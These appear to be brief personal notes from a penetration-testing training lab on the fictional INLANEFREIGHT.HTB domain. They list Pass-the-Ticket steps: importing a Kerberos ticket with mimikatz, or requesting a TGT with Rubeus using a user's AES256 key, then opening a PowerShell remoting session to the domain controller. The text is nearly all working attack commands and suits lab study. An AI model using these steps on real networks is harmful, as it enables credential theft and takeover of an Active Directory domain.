# PTT PS + MIMIKATZ
```
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
exit
```
```
powershell
Enter-PSSession -ComputerName DC01
```
```
whoami
hostname
```


# PTT PS + RUBEUS 
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
will open a new cmd window. From that window, request a new TGT
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
```
```
powershell
Enter-PSSession -ComputerName DC01
```
```
whoami
hostname
```



















